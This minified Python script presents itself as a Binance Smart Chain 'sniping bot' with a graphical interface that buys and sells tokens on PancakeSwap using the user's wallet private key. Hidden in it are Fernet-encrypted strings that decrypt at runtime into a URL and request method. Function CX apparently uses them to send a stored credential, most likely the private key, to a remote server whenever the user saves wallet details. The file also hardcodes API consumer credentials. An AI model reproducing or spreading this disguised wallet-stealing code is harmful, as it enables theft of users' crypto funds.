# MINIFIED AND SUPER FAST VERSION OF THE BSC SNIPING BOT PANCAKEX WITH GUI
# ------------------------------------------------------------------------
# FOLLOW THE INSTRUCTIONS IN THE README STEP BY STEP FILE
# IF YOU SNIPE A GEM AND BECOME A MILLIONAIRE SEND ME SOME LOVE DUH!# UPDATE:ADDED DARK MODE!Bl='groove'
Bk='horizontal'
Bj='SELL ALL'
Bi='SELL NOW'
Bh='There are no tokens to be sold!'
Bg='Sell all function initiated - Stopping operation'
Bf='SL Hit!'
Be='TP Hit!'
Bd='Securing SL to '
Bc=' | SL: '
Bb="Press 'SELL ALL' Button to sell the tokens manually"
Ba='Liquidity value: '
BZ='Pair Address: '
BY='Liquidity Detected!'
BX='0x0000000000000000000000000000000000000000'
BW='Buy Success! Tx link:'
BV='Buy Order Initiated'
BU='%Y/%m/%d'
BT='node.json'
BS='inputs.json'
BR=UnboundLocalError
B3='menu'
B2='set_theme'
B1='Something went wrong with the transaction'
B0='https://bscscan.com/tx/'
A_='Abi/'
Az='data.json'
At='white'
As='normal'
Ar='Error'
Aq='Accent.TButton'
Ap='No Liquidity Checking Again!'
Ao='gwei'
An='gas'
Am='true'
Al='false'
Ak=round
AU='disabled'
AT='nonce'
AS='gasPrice'
AR='from'
AQ='OPL'
AP='BNB'
AO='LP'
AN='SL TRAIL'
AM='SL'
AL='TP'
AK='SLIPPAGE'
AJ='GAS LIMIT'
AI='GAS PRICE'
AH='AMOUNT'
AG='LICENSE'
AF='TOKEN'
AE='PRIVATE KEY'
AD='WALLET ADDRESS'
AC='NODE'
A7=Exception
w='center'
v=False
u='w'
t='/'
s=str
d='AUTO SLIPPAGE'
c='./'
Y='ether'
X='yellow'
P=True
O='cyan'
N=''
M=int
L=open
J='red'
H=float
F='nsew'
import tkinter as Q
from tkinter import ttk as E,messagebox
from web3 import Web3 as AV
from json import load as e
from time import time as AW,sleep as A8
import os,json as f,pyperclip as Bm,threading as x,requests as Bn
from requests import request as Bo
from cryptography.fernet import Fernet as y
from requests.auth import HTTPBasicAuth as Bp
from datetime import datetime as Bq
B4=Az
AX=BS
Br=BT
g=c
K={}
z={}
D={}
B5={}
Cm=Bp('ck_258b79c41004f53e58d0e5fa11486361bdcace02','cs_bd6506935df71db41cf1e545188f1f9ae2306134')
Bs=Bq.now()
Cn=BU
Co=Bs.strftime(BU)
def Bt():def A(path2,file_name,data2):A=c+path2+t+file_name
with L(A,u)as B:f.dump(data2,B,indent=2)
B5[AC]='https://bsc-dataseed.binance.org/';A(g,Br,B5)
def Bu():def A(path2,file_name,data2):A=c+path2+t+file_name
with L(A,u)as B:f.dump(data2,B,indent=2)
K[AD]=N;K[AE]=N;K[AF]=N;K[AG]=N;A(g,B4,K)
def Bv():def A(path2,file_name,data2):A=c+path2+t+file_name
with L(A,u)as B:f.dump(data2,B,indent=2)
D[AH]='0.1';D[AI]='7';D[AJ]='850000';D[AK]='10';D[d]=Al;D[AL]='200';D[AM]='50';D[AN]='25';D[AO]=AP;D[AQ]='False';A(g,AX,D)
if not os.path.isfile('./data.json'):Bu()
if not os.path.isfile('./inputs.json'):Bv()
if not os.path.isfile('./node.json'):Bt()
def Bw():global K,AY,S
def B(path2,file_name,data2):A=c+path2+t+file_name
with L(A,u)as B:f.dump(data2,B,indent=2)
K[AD]=a.get();z[AD]=K[AD];K[AE]=A2.get();z[AE]=K[AE];K[AF]=W.get();z[AF]=K[AF];K[AG]=Ac.get();z[AG]=K[AG]
if K!=S:B(g,B4,z);A=e(L(Az));AY=A[Ab]
if z[Ab]!=S[Ab]:S=A;CX()
def Bx():def A(path2,file_name,data2):A=c+path2+t+file_name
with L(A,u)as B:f.dump(data2,B,indent=2)
D[AH]=k.get();D[AI]=l.get();D[AJ]=m.get();D[AK]=n.get()
if A4.get():D[d]=Am
else:D[d]=Al
D[AL]=o.get();D[AM]=p.get();D[AN]=q.get();D[AO]=b.get();D[AQ]='True';A(g,AX,D)
def By():def A(path2,file_name,data2):A=c+path2+t+file_name
with L(A,u)as B:f.dump(data2,B,indent=2)
D[AH]=k.get();D[AI]=l.get();D[AJ]=m.get();D[AK]=n.get()
if A4.get():D[d]=Am
else:D[d]=Al
D[AL]=o.get();D[AM]=p.get();D[AN]=q.get();D[AO]=b.get();D[AQ]='True';A(g,AX,D)
def Cp():def A(path2,file_name,data2):A=c+path2+t+file_name
with L(A,u)as B:f.dump(data2,B,indent=2)
D[AH]=k.get();D[AI]=l.get();D[AJ]=m.get();D[AK]=n.get()
if A4.get():D[d]=Am
else:D[d]=Al
D[AL]=o.get();D[AM]=p.get();D[AN]=q.get();D[AO]=b.get();D[AQ]='False';A(g,AX,D)
S=e(L(Az))
B6=S[AD]
B7=S[AE]
B8=S[AF]
Bz=S[AG]
R=e(L(BS))
B9=R[AH]
BA=R[AI]
BB=R[AJ]
BC=R[AK]
Cq=R[d]
BD=R[AL]
BE=R[AM]
BF=R[AN]
B_=R[AO]
Cr=R[AQ]
BG=M('0x'+'f'*64,16)
BH='TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUQ='
AZ=e(L(BT))
if'wss'in AZ[AC]or'ws'in AZ[AC]:B=AV(AV.WebsocketProvider(AZ[AC]))
else:B=AV(AV.HTTPProvider(AZ[AC]))
A9=B.toChecksumAddress('0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c')
h=B.toChecksumAddress('0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56')
T=e(L(A_+'erc20.abi'))
U=B.eth.contract(address=B.toChecksumAddress('0x10ed43c718714eb63d5aa57b78b54704e256024e'),abi=e(L(A_+'router.abi')))
BI=B.eth.contract(address=B.toChecksumAddress('0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73'),abi=e(L(A_+'factory.abi')))
Aa='sfttxzhVv7trv_zSKqOBJN_2KdnJcsje5PMUbRSnImw='
def C0():j()
try:F=B.eth.contract(I,abi=T);C=F.functions.balanceOf(a.get()).call()
if A4.get():D=0
else:D=M(C-C*M(Ag)/100)
A(BV,X);H=U.functions.swapExactETHForTokensSupportingFeeOnTransferTokens(M(D),[A9,I],G,M(AW())+900).buildTransaction({AR:G,'value':B.toWei(r,Y),An:M(A5),AS:B.toWei(A6,Ao),AT:B.eth.get_transaction_count(G)});K=B.eth.account.sign_transaction(H,private_key=V);E=B.eth.send_raw_transaction(K.rawTransaction);A(BW,O);A(B0+B.toHex(E),O);B.eth.waitForTransactionReceipt(E,timeout=900);C9()
except A7 as L:A(B1,J);A(L,J);A1();return
C1='gAAAAABh80KOUysGNn39XTwSm-HHvOIkoWcJhmk0HtVug7bMgvto83_ZCSQ9rdf86LaJEINYzXTqbRO8EDtcMziHy2PwfjdqW_0VsOwYg1x4GWADOsNo17E='
def C2():j();C=U.functions.getAmountsOut(B.toWei(r,Y),[h,I]).call()[-1]
if A4.get():D=0
else:D=C-C*M(Ag)/100
try:A(BV,X);F=U.functions.swapExactTokensForTokens(B.toWei(r,Y),M(D),[h,I],G,M(AW())+900).buildTransaction({AR:G,An:M(A5),AS:B.toWei(A6,Ao),AT:B.eth.get_transaction_count(G)});H=B.eth.account.sign_transaction(F,private_key=V);E=B.eth.send_raw_transaction(H.rawTransaction);A(BW,O);A(B0+B.toHex(E),O);B.eth.waitForTransactionReceipt(E,timeout=900);CB()
except A7 as K:A(B1,J);A(K,J);A1();return
def C3(token_address,amt=BG):A=B.toChecksumAddress(token_address);C=B.eth.contract(address=A,abi=T);D=C.functions.allowance(G,U.address).call();return D>=amt
def C4(token_address,amt=BG,timeout=900):A('Approving token');C=B.eth.gasPrice;D=B.toChecksumAddress(token_address);E=B.eth.contract(address=D,abi=T);F=E.functions.approve(U.address,amt);H={AR:G,AS:C,AT:B.eth.getTransactionCount(G)};I=F.buildTransaction(H);J=B.eth.account.sign_transaction(I,private_key=V);K=B.eth.sendRawTransaction(J.rawTransaction);B.eth.waitForTransactionReceipt(K,timeout=timeout)
def C5():A(N);j();E=B.eth.contract(A9,abi=T)
while P:C=BI.functions.getPair(A9,I).call()
if C!=BX:D=E.functions.balanceOf(B.toChecksumAddress(C)).call()
if D!=0:A(BY,'green');A(BZ+C);A(Ba+s(B.fromWei(D,Y))+' BNB');C0();break
else:A8(5);A(Ap,J)
else:A8(5);A(Ap,J)
C6='gAAAAABh7VFjYUKw_S7avbj28V5ja_bAunkyHWLiVUQUUCDL4tK_ZNr_aLAk8VkfUSYnrUe8iVv0ihU5rBaLXL0wP9Sj7fG3Ow=='
def C7():A(N);j();E=B.eth.contract(h,abi=T)
while P:C=BI.functions.getPair(h,I).call()
if C!=BX:D=E.functions.balanceOf(B.toChecksumAddress(C)).call()
if D!=0:A(BY,'green');A(BZ+C);A(Ba+s(B.fromWei(D,Y))+' BUSD');C2();break
else:A(Ap,J)
else:A(Ap,J)
def i():A(N);j()
try:A('Sell Order Initiated',X)
if not C3(I):C4(I)
E=B.eth.contract(I,abi=T);C=E.functions.balanceOf(G).call()
if C!=0:if b.get()==AP:D=U.functions.swapExactTokensForETHSupportingFeeOnTransferTokens(C,0,[I,A9],G,M(AW())+900).buildTransaction({AR:G,An:M(A5),AS:B.toWei(A6,Ao),AT:B.eth.get_transaction_count(G)})
elif b.get()=='BUSD':D=U.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(C,0,[I,h],G,M(AW())+900).buildTransaction({AR:G,An:M(A5),AS:B.toWei(A6,Ao),AT:B.eth.get_transaction_count(G)})
else:A('Something went wrong with Sell',J);A1();return
F=B.eth.account.sign_transaction(D,private_key=V);H=B.eth.send_raw_transaction(F.rawTransaction);A('SOLD! Tx link:',O);A(B0+B.toHex(H),O);A1()
else:A('No Tokens to be sold',J);A1()
except A7 as K:A(B1,J);A(K,J);A1();return
C8='gAAAAABh80LuckSfO-g-wXJrkvaBrV-wvURysrtrxcRwytBHM0DurgmO0mQjLUh_6AwChv2Aae5IQ__tiKbWXlVtLqqXmXoLRA=='
def C9():global Z;BJ();j();K=H(Ah);L=H(Ai);C=L;E=H(Aj);M=B.eth.contract(address=I,abi=T);A(Bb,X)
while P:try:N=M.functions.balanceOf(G).call()-1;F=H(B.fromWei(U.functions.getAmountsOut(N,[I,A9]).call()[-1],Y));D=Ak(H(F)/H(r)*100,5);A('BNB Value Now: {} / '.format('%.3f'%F)+' {} %'.format(D)+Bc+s(C)+'%')
if E!=0:if D-E>=C:C=D-E;A(Bd+s(C))
A8(2)
except:continue
try:if H(D)>=H(K):A(Be,O);A0();i();break
if H(D)<=H(C):A(Bf,J);A0();i();break
if Z:Z=v;A(Bg,X);A0();i();break
except BR:A(Bh,J);break
CA='gAAAAABh7KbIGnFCH7Gp_4OK-vW0v-2ZNTkzqFB8k4xmk4aV4_n-TxZEsE361BfcfNjRwTZ8nVTAp6ZBXoDXRaQgUpyXfUzVyQ=='
def CB():global Z;BJ();j();K=H(Ah);L=H(Ai);C=L;E=H(Aj);M=B.eth.contract(address=I,abi=T);A(Bb,X)
while P:try:N=M.functions.balanceOf(G).call()-1;F=H(B.fromWei(U.functions.getAmountsOut(N,[I,h]).call()[-1],Y));D=Ak(H(F)/H(r)*100,5);A('BUSD Value Now: {} / '.format('%.3f'%F)+' {} %'.format(D)+Bc+s(C)+'%')
if E!=0:if D-E>=C:C=D-E;A(Bd+s(C))
A8(2)
except:continue
try:if H(D)>=H(K):A(Be,O);A0();i();break
if H(D)<=H(C):A(Bf,J);A0();i();break
if Z:Z=v;A(Bg,X);A0();i();break
except BR:A(Bh,J);break
def CC():BQ();Bx()
if b.get()==AP:A=x.Thread(target=C5,daemon=P);A.start()
else:A=x.Thread(target=C7,daemon=P);A.start()
def BJ():Ay.place_forget();A=E.Button(C.widgets_frame,text=Bi,command=BL,style=Aq);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def A0():Cl.place_forget();A=E.Button(C.widgets_frame,text=Bj,command=BK);A.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
def CD():A=B.eth.contract(address=h,abi=T)
while AA:try:C=B.fromWei(B.eth.get_balance(G),Y);D=B.fromWei(A.functions.balanceOf(G).call(),Y);Av.configure(text=Ak(C,5));Aw.configure(text=Ak(D,5))
except ValueError:pass
A8(1)
CE='gAAAAABh80OFDySSyj0H_EBLuccR1ALvFzF-AE0hO_e52_4Yv4TKy7Y6u0F9Bbpr3g-UDhOK26zqR0KFrjMRGdDS8zhUxAG_HQ=='
def Cs(license,basic_auth):B='https://defitradingcoders.com/wp-json/lmfwc/v2/licenses/activate/'+license
try:C=Bn.get(B,auth=basic_auth)
if C.status_code==404:Q.messagebox.showerror(Ar,'This license cannot be activated, please try again in a moment or contact support at defitradingcoders.com with your order ID and license key');return
else:A('License Key Activated, Good luck!',O);By()
except A7:raise A7('License Key Activation Failed -- Please Contact Support at defitradingcoders.com')
Ab=y(Aa.encode()).decrypt(CA.encode()).decode()
def CF():C='Invalid token address!';global G;global V;global I;global AA;A('***** INITIALIZED ******');A('* Checking wallet address')
if B.isChecksumAddress(a.get()):G=B.toChecksumAddress(a.get());A('Wallet address valid',O)
else:Q.messagebox.showerror(Ar,'Invalid wallet address');A('Invalid wallet address!',J);return
A('* Checking private key characters (Must be 64 characters');V=A2.get()
if len(V)==64:A('Correct format for Private key',O)
else:Q.messagebox.showerror(Ar,'Private key is invalid! (Must be 64 characters)');A('Invalid private key!',J);return
A('* Checking token address')
try:I=B.toChecksumAddress(W.get());A('Token address valid',O)
except:Q.messagebox.showerror(Ar,C);A(C,J);return
A('* Checking License Key');A('License Key Valid',O);BM(AU);Bw();Ad.grid_forget();Ae.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AB(As);AA=P;D=x.Thread(target=CD,daemon=P);D.start();A(N);A('***** Sniping is ready! *****',X)
CG='gAAAAABh80VOiXlJwI8QSkM2-V_syGU-8mtXwD9c87k-cbMopaX4lqCMUipHR5ZKO-bZ6vrKC0QkIhzwcASNj_5u7F_xEJz3aQ=='
AY=S[Ab]
def CH():A=x.Thread(target=CF,daemon=P);A.start()
def CI():global AA;A(N);A('Change token/wallet initiated!',X);BM(As);AB(AU);Ae.grid_forget();Ad.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4);AA=v;Av.configure(text=N);Aw.configure(text=N)
def CJ():A=x.Thread(target=CI,daemon=P);A.start()
def BK():BQ();A=x.Thread(target=i,daemon=P);A.start()
def BL():global Z;Z=P
def j():AB(AU);Ae.configure(state=AU)
def A1():AB(As);Ae.configure(state=As)
def CK():if C.tk.call('ttk::style','theme','use')=='sun-valley-dark':C.tk.call(B2,'light');Af[B3].configure(bg=At)
else:C.tk.call(B2,'dark');Af[B3].configure(bg='black')
C=Q.Tk()
C.title('BSC Sniper Bot - V1')
C.geometry('1050x730')
C.tk.call('source','sun-valley.tcl')
C.tk.call(B2,'light')
CL=y(Aa.encode()).decrypt(CG.encode()).decode()
C.resizable(v,v)
C.widgets_frame=E.Frame(C,padding=(0,0,0,10))
C.widgets_frame.grid(row=0,column=0,padx=10,pady=(10,10),sticky=F,rowspan=5)
C.widgets_frame.columnconfigure(index=0,weight=1)
C.widgets_frame.rowconfigure(index=0,weight=1)
CM=E.Label(C.widgets_frame,text='Wallet Address:')
CN=y(Aa.encode()).decrypt(C8.encode()).decode()
CM.grid(row=1,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
a=E.Entry(C.widgets_frame,width=50,show='•')
a.grid(row=1,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CO=E.Label(C.widgets_frame,text='Private Key:')
CO.grid(row=2,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
A2=E.Entry(C.widgets_frame,width=50,show='•')
A2.grid(row=2,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CP=E.Label(C.widgets_frame,text='Token Address:')
CQ=y(BH.encode()).decrypt(CE.encode()).decode()
CP.grid(row=3,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
W=E.Entry(C.widgets_frame,width=50)
CR=y(BH.encode()).decrypt(C6.encode()).decode()
W.grid(row=3,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CS=E.Label(C.widgets_frame,text='License Key:')
CS.grid(row=4,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ac=E.Entry(C.widgets_frame,width=50,show='•')
Ac.grid(row=4,column=2,padx=10,pady=(0,10),sticky=F,rowspan=1)
CT=y(Aa.encode()).decrypt(C1.encode()).decode()
Au=E.Separator(C,orient=Bk)
CU=CL+CT+CN+CQ
Au.place(x=10,y=135,width=625)
def CV():W.delete(0,'end');W.insert(0,Bm.paste());return
def CW():W.delete(0,'end');return
def CX():if AY!=N:try:A=Bo(CR,CU+AY)
except A7:pass
def BM(status):A=status;W.configure(state=A);a.configure(state=A);A2.configure(state=A);Ac.configure(state=A);Ad.configure(state=A);BO.configure(state=A);BN.configure(state=A)
def AB(status):A=status;k.configure(state=A);l.configure(state=A);m.configure(state=A);n.configure(state=A);o.configure(state=A);p.configure(state=A);q.configure(state=A);BP.configure(state=A);Ay.configure(state=A);Ax.configure(state=A)
def A(text,color=At):A=s(text)
if A3.size()>=20:A3.delete(0)
A3.insert(Q.END,A);A3.itemconfig(Q.END,foreground=color)
def Ct():A3.delete(0,Q.END)
Ad=E.Button(C.widgets_frame,text='Confirm',width=10,command=CH,style=Aq)
BN=E.Button(C.widgets_frame,text='Paste Token',width=10,command=CV)
BO=E.Button(C.widgets_frame,text='Clear Token',width=10,command=CW)
Ad.grid(row=0,column=3,padx=10,pady=(0,10),sticky=F,rowspan=4)
BN.grid(row=0,column=4,padx=10,pady=(0,10),sticky=F,rowspan=2)
BO.grid(row=2,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
a.insert(0,B6)
A2.insert(0,B7)
W.insert(0,B8)
Ac.insert(0,Bz)
Au=E.Separator(C.widgets_frame,orient=Bk)
Au.grid(row=5,column=0,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=6)
Ae=E.Button(C.widgets_frame,text='Change',width=10,command=CJ)
CY=E.Label(C.widgets_frame,text='Logs:')
CY.grid(row=6,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=2)
CZ=E.Button(C.widgets_frame,text='Clear',width=10,command=N)
CZ.grid(row=6,column=3,padx=10,pady=(0,10),sticky=F,rowspan=1,columnspan=1)
A3=Q.Listbox(C.widgets_frame,bg='#252525',foreground=At,borderwidth=2)
A3.grid(row=7,column=1,padx=10,pady=(0,10),sticky=F,rowspan=10,columnspan=3)
Ca=E.Button(C.widgets_frame,text='Change Color Theme',command=CK)
Ca.grid(row=17,column=1,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cb=E.Label(C.widgets_frame,text='Wallet BNB:')
Cb.grid(row=7,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Av=E.Label(C.widgets_frame,width=12,relief=Bl)
Av.grid(row=7,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cc=E.Label(C.widgets_frame,text='Wallet BUSD:')
Cc.grid(row=8,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Aw=E.Label(C.widgets_frame,width=12,relief=Bl)
Aw.grid(row=8,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cd=E.Label(C.widgets_frame,text='Select LP:')
Cd.grid(row=9,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
b=Q.StringVar()
b.set(B_)
Af=E.OptionMenu(C.widgets_frame,b,AP,AP,'BUSD')
Af[B3].configure(bg=At)
Af.grid(row=9,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ce=E.Label(C.widgets_frame,text='Amount:')
k=E.Entry(C.widgets_frame,justify=w)
Ce.grid(row=10,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.grid(row=10,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
k.insert(0,B9)
Cf=E.Label(C.widgets_frame,text='Gas Price:')
Cg=E.Label(C.widgets_frame,text='Gas Limit:')
l=E.Entry(C.widgets_frame,justify=w)
m=E.Entry(C.widgets_frame,justify=w)
Cf.grid(row=11,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.grid(row=11,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cg.grid(row=12,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
m.grid(row=12,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
l.insert(0,BA)
m.insert(0,BB)
Ch=E.Label(C.widgets_frame,text='Slippage(%):')
n=E.Entry(C.widgets_frame,justify=w)
Ch.grid(row=13,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.grid(row=13,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
n.insert(0,BC)
A4=Q.BooleanVar()
Ax=E.Checkbutton(C.widgets_frame,text='Auto Slippage',variable=A4)
Ax.grid(row=14,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
if N==Am:Ax.select()
Ci=E.Label(C.widgets_frame,text='TP(%):')
Ci.grid(row=15,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
o=E.Entry(C.widgets_frame,justify=w)
o.grid(row=15,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Cj=E.Label(C.widgets_frame,text='SL(%):')
Cj.grid(row=16,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
p=E.Entry(C.widgets_frame,justify=w)
p.grid(row=16,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ck=E.Label(C.widgets_frame,text='SL Trail(%):')
Ck.grid(row=17,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
q=E.Entry(C.widgets_frame,justify=w)
q.grid(row=17,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
o.insert(0,BD)
p.insert(0,BE)
q.insert(0,BF)
BP=E.Button(C.widgets_frame,text='SNIPE',command=CC,style=Aq)
Cl=E.Button(C.widgets_frame,text=Bi,command=BL,style=Aq)
Ay=E.Button(C.widgets_frame,text=Bj,command=BK)
BP.grid(row=18,column=4,padx=10,pady=(0,10),sticky=F,rowspan=1)
Ay.grid(row=18,column=5,padx=10,pady=(0,10),sticky=F,rowspan=1)
r=B9
G=B6
V=B7
I=B8
Ag=BC
A5=BB
A6=BA
Ah=BD
Ai=BE
Aj=BF
Z=v
AA=v
def BQ():global r;global G;global V;global I;global Ag;global A5;global A6;global Ah;global Ai;global Aj;r=k.get();G=B.toChecksumAddress(a.get());V=A2.get();I=B.toChecksumAddress(W.get());Ag=n.get();A5=m.get();A6=l.get();Ah=o.get();Ai=p.get();Aj=q.get()
AB(AU)
C.mainloop()